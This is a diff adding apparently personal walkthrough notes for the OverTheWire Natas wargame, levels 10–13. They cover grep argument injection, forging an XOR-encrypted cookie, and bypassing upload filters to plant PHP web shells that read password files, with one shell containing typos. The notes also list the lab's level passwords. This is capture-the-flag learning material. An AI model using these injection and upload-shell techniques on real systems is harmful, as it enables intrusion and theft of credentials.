@@ -1,0 +1,71 @@
+ername: natas10
+Password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+URL:      http://natas10.natas.labs.overthewire.org
+
+	problem: another page like level 9, but it checks your input for ";" or "&" and other characters.
+
+	answer: it still takes advantage of grep, so we can leverage that to cat the file by commenting out the reference to the dictionary.txt file with the following: .* /etc/natas_webpass/natas11 #
+
+	password: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+__________________________________________________________________________
+
+Level 11:
+Username: natas11
+Password: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+URL:      http://natas11.natas.labs.overthewire.org
+
+	problem: we come across a page that says 'cookies are protected with xor encryption:
+
+	answer: we view cookies and find the following: ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D.
+
+
+	solution: xor encryption is vulnerable in the following way: 
+		plaintext xor key = ciphertext
+		ciphertext xor key = plaintext
+
+		heres proof: 1101 ^ 1011 = 0110
+			     0110 ^ 1011 = 1101
+	
+	so we can write a script to xor the cookie with the plaintext to get a key. 
+
+	after that, create plaintext that sends "showpassword=yes" and encode it, then xor it with our newfound key. 
+
+	then use your browsers inspect element to do document.cookie"name=value". submit this to the natas11 page and get your password.
+_________________________________________________________________________________
+Level 12
+Username: natas12
+Password: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+URL: http://natas12.natas.labs.overthewire.org
+
+	problem: it seems to be a file upload page, probably restricted by length or file type.
+
+	try making some php code in a file with 
+		 echo "<?php echo system(\"cat /etc/natas_webpass/natas13\"); ?>" > natas12.jpg
+
+	now lets upload this, then navigate to it.
+
+	okay so you'll notice its still a jpg, and even if you upload a file called natas12.php, it will change it to a jpg. this happens on the client though, so if we configure burpsuite as a proxy, then change it from a .jpg to a .php after it leaves the client, we're good.
+
+	now navigate to the file and you will have the password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
+__________________________________________________________________________________
+Level 13
+Username: natas13
+Password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+URL: http://natas13.natas.labs.overthewire.org 	
+
+	problem: another upload page, but php uses exif_imagetype to try and restrict our upload to jpg files. this works by checking the first bits of the file for the bits that are unique to jpg files,0xFFD8FFE0
+
+	solution: make a python script to write to a .jpg file, and add 
+('\xFF\xD8\xFF\xE0' + '<? passthry($_GET["cmd]); ?>') to the file.
+
+after this, upload it to the overthewire server using the same burpsuite techniques as before to change .jpg to .php to bypass that client side change, then navigate to your uploaded file, and add ?cmd=cat /etc/natas_webpass_natas14 after the url.
+
+password: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+
+___________________________________________________________
+Level 14
+Username: natas14
+Password: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+URL: http://natas14.natas.labs.overthewire.org
